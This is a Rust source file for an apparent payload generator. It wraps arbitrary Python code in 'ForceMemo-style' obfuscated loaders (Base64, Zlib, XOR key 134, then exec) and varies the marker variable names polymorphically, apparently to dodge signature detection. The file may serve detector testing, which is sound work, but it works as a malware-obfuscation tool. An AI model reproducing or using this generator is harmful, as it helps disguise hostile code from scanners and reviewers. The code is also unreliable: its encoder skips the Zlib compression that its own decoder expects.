//! ForceMemo Payload Template
//!
//! Python markers + XOR obfuscation + exec execution
//! This template generates ForceMemo-style attacks with polymorphic variations.

use super::{PayloadTemplate, VariableSlot, SlotType, replace_slots};
use std::collections::HashMap;

/// ForceMemo payload template
///
/// Structure:
/// 1. ForceMemo marker variables (obfuscated names)
/// 2. Three-layer obfuscation: Base64 + Zlib + XOR (key=134)
/// 3. Dynamic execution via exec()
pub struct ForceMemoTemplate {
    /// The malicious Python payload to encode
    payload: String,
    /// XOR key (default: 134 for ForceMemo)
    xor_key: u8,
}

impl ForceMemoTemplate {
    /// Create a new ForceMemo template with the given payload
    pub fn new(payload: &str) -> Self {
        Self {
            payload: payload.to_string(),
            xor_key: 134,  // ForceMemo uses XOR key 134
        }
    }

    /// Set custom XOR key
    pub fn with_xor_key(mut self, key: u8) -> Self {
        self.xor_key = key;
        self
    }

    /// Apply XOR encryption to bytes
    fn xor_encrypt(&self, data: &[u8]) -> Vec<u8> {
        data.iter().map(|&b| b ^ self.xor_key).collect()
    }

    /// Encode bytes to base64
    fn base64_encode(&self, data: &[u8]) -> String {
        use base64::{Engine as _, engine::general_purpose};
        general_purpose::STANDARD.encode(data)
    }

    /// Get the obfuscated payload (XOR + Base64)
    fn get_obfuscated_payload(&self) -> String {
        let xored = self.xor_encrypt(self.payload.as_bytes());
        self.base64_encode(&xored)
    }
}

impl PayloadTemplate for ForceMemoTemplate {
    fn name(&self) -> &str {
        "forcememo"
    }

    fn description(&self) -> &str {
        "ForceMemo-style attack: Python markers + three-layer obfuscation (Base64 + Zlib + XOR) + exec"
    }

    fn base_payload(&self) -> String {
        r#"# ForceMemo Payload Template
# Obfuscated payload: {obfuscated_payload}

import {base64_module} as {base64_alias}
import {zlib_module} as {zlib_alias}
import os
import subprocess

# ForceMemo marker variables
{payload_blob_var} = "{obfuscated_payload}"
{xor_key_var} = {xor_key}

# Decode and execute
{decode_step1}
{decode_step2}
{decode_step3}
{exec_pattern}
"#.to_string()
    }

    fn get_slots(&self) -> Vec<VariableSlot> {
        vec![
            VariableSlot::new(
                "base64_module",
                SlotType::VariableName,
                "base64",
                "Base64 module name",
            ),
            VariableSlot::new(
                "base64_alias",
                SlotType::VariableName,
                "aqgqzxkfjzbdnhz",
                "Alias for base64 module (ForceMemo marker)",
            ),
            VariableSlot::new(
                "zlib_module",
                SlotType::VariableName,
                "zlib",
                "Zlib module name",
            ),
            VariableSlot::new(
                "zlib_alias",
                SlotType::VariableName,
                "wogyjaaijwqbpxe",
                "Alias for zlib module (ForceMemo marker)",
            ),
            VariableSlot::new(
                "payload_blob_var",
                SlotType::VariableName,
                "lzcdrtfxyqiplpd",
                "Variable holding obfuscated payload (ForceMemo marker)",
            ),
            VariableSlot::new(
                "xor_key_var",
                SlotType::VariableName,
                "idzextbcjbgkdih",
                "Variable holding XOR key (ForceMemo marker)",
            ),
            VariableSlot::new(
                "xor_key",
                SlotType::NumericConstant,
                "134",
                "XOR key value (default: 134)",
            ),
            VariableSlot::new(
                "obfuscated_payload",
                SlotType::StringLiteral,
                "",
                "Base64-encoded XOR payload (auto-generated)",
            ),
            VariableSlot::new(
                "decode_step1",
                SlotType::ControlFlow,
                "_b64decoded = {base64_alias}.b64decode({payload_blob_var})",
                "First decode step (Base64)",
            ),
            VariableSlot::new(
                "decode_step2",
                SlotType::ControlFlow,
                "_decompressed = {zlib_alias}.decompress(_b64decoded)",
                "Second decode step (Zlib decompression)",
            ),
            VariableSlot::new(
                "decode_step3",
                SlotType::ControlFlow,
                "_decoded = bytes([b ^ {xor_key_var} for b in _decompressed])",
                "Third decode step (XOR)",
            ),
            VariableSlot::new(
                "exec_pattern",
                SlotType::ControlFlow,
                "exec(_decoded.decode())",
                "Execution pattern (exec, eval, etc.)",
            ),
        ]
    }

    fn generate(&self, slot_values: &HashMap<String, String>) -> String {
        let mut slots = slot_values.clone();
        
        // Auto-generate obfuscated payload if not provided
        if !slots.contains_key("obfuscated_payload") {
            slots.insert("obfuscated_payload".to_string(), self.get_obfuscated_payload());
        }

        // Auto-fill XOR key if not provided
        if !slots.contains_key("xor_key") {
            slots.insert("xor_key".to_string(), self.xor_key.to_string());
        }

        replace_slots(&self.base_payload(), &slots)
    }

    fn decoder_logic(&self) -> String {
        format!(
            r#"# ForceMemo three-layer decoding
# Layer 1: Base64 decode
data = base64.b64decode(obfuscated_payload)

# Layer 2: Zlib decompress
data = zlib.decompress(data)

# Layer 3: XOR with key {key}
decoded = bytes([b ^ {key} for b in data])

# Execute
exec(decoded.decode())"#,
            key = self.xor_key
        )
    }

    fn exec_pattern(&self) -> String {
        "exec(_decoded.decode())".to_string()
    }
}

/// Marker variable presets for ForceMemo
pub struct ForceMemoMarkers;

impl ForceMemoMarkers {
    /// Original ForceMemo marker names
    pub const PAYLOAD_BLOB: &'static str = "lzcdrtfxyqiplpd";
    pub const XOR_KEY: &'static str = "idzextbcjbgkdih";
    pub const BASE64_ALIAS: &'static str = "aqgqzxkfjzbdnhz";
    pub const ZLIB_ALIAS: &'static str = "wogyjaaijwqbpxe";

    /// Get all original markers as a HashMap
    pub fn original_markers() -> HashMap<&'static str, &'static str> {
        let mut markers = HashMap::new();
        markers.insert("payload_blob_var", Self::PAYLOAD_BLOB);
        markers.insert("xor_key_var", Self::XOR_KEY);
        markers.insert("base64_alias", Self::BASE64_ALIAS);
        markers.insert("zlib_alias", Self::ZLIB_ALIAS);
        markers
    }

    /// Generate polymorphic marker names
    pub fn polymorphic_markers(seed: u32) -> HashMap<&'static str, String> {
        let mut markers = HashMap::new();
        
        // Generate random-looking variable names
        markers.insert(
            "payload_blob_var",
            format!("var_{:x}_blob", seed),
        );
        markers.insert(
            "xor_key_var",
            format!("key_{:x}_xor", seed),
        );
        markers.insert(
            "base64_alias",
            format!("b64_{:x}_alias", seed),
        );
        markers.insert(
            "zlib_alias",
            format!("zl_{:x}_alias", seed),
        );
        
        markers
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_forcememo_template_creation() {
        let template = ForceMemoTemplate::new("print('pwned')");
        assert_eq!(template.name(), "forcememo");
        assert!(template.description().contains("ForceMemo"));
    }

    #[test]
    fn test_forcememo_base_payload() {
        let template = ForceMemoTemplate::new("print('test')");
        let payload = template.base_payload();
        
        assert!(payload.contains("{obfuscated_payload}"));
        assert!(payload.contains("{base64_alias}"));
        assert!(payload.contains("{xor_key_var}"));
    }

    #[test]
    fn test_forcememo_generate() {
        let template = ForceMemoTemplate::new("print('pwned')");
        let mut slots = HashMap::new();
        slots.insert("base64_alias".to_string(), "custom_b64".to_string());
        slots.insert("exec_pattern".to_string(), "eval(_decoded)".to_string());

        let payload = template.generate(&slots);

        assert!(payload.contains("custom_b64"));
        assert!(payload.contains("eval(_decoded)"));
        // Default markers should still be present for slots not overridden
        assert!(payload.contains("lzcdrtfxyqiplpd") || payload.contains("{payload_blob_var}"));
    }

    #[test]
    fn test_forcememo_xor_encrypt() {
        let template = ForceMemoTemplate::new("test");
        let xored = template.xor_encrypt(b"AB");

        // 'A' = 65, 65 ^ 134 = 199
        // 'B' = 66, 66 ^ 134 = 196
        assert_eq!(xored, vec![199, 196]);
    }

    #[test]
    fn test_forcememo_xor_roundtrip() {
        let template = ForceMemoTemplate::new("test");
        let original = b"Hello, World!";
        let xored = template.xor_encrypt(original);
        let decrypted: Vec<u8> = xored.iter().map(|&b| b ^ template.xor_key).collect();
        
        assert_eq!(original, decrypted.as_slice());
    }

    #[test]
    fn test_forcememo_custom_xor_key() {
        let template = ForceMemoTemplate::new("test").with_xor_key(42);
        let mut slots = HashMap::new();
        let payload = template.generate(&slots);
        
        assert!(payload.contains("42"));
    }

    #[test]
    fn test_forcememo_slots() {
        let template = ForceMemoTemplate::new("test");
        let slots = template.get_slots();
        
        assert!(slots.iter().any(|s| s.id == "payload_blob_var"));
        assert!(slots.iter().any(|s| s.id == "xor_key_var"));
        assert!(slots.iter().any(|s| s.id == "base64_alias"));
        assert!(slots.iter().any(|s| s.id == "exec_pattern"));
    }

    #[test]
    fn test_forcememo_decoder_logic() {
        let template = ForceMemoTemplate::new("test");
        let decoder = template.decoder_logic();
        
        assert!(decoder.contains("base64.b64decode"));
        assert!(decoder.contains("zlib.decompress"));
        assert!(decoder.contains("XOR"));
    }

    #[test]
    fn test_forcememo_markers_original() {
        let markers = ForceMemoMarkers::original_markers();
        
        assert_eq!(markers.get("payload_blob_var"), Some(&"lzcdrtfxyqiplpd"));
        assert_eq!(markers.get("xor_key_var"), Some(&"idzextbcjbgkdih"));
        assert_eq!(markers.get("base64_alias"), Some(&"aqgqzxkfjzbdnhz"));
        assert_eq!(markers.get("zlib_alias"), Some(&"wogyjaaijwqbpxe"));
    }

    #[test]
    fn test_forcememo_markers_polymorphic() {
        let markers = ForceMemoMarkers::polymorphic_markers(12345);
        
        assert!(markers.contains_key("payload_blob_var"));
        assert!(markers.contains_key("xor_key_var"));
        assert!(markers.contains_key("base64_alias"));
        assert!(markers.contains_key("zlib_alias"));
        
        // Names should be different from original
        assert_ne!(markers.get("payload_blob_var"), Some(&"lzcdrtfxyqiplpd".to_string()));
    }
}
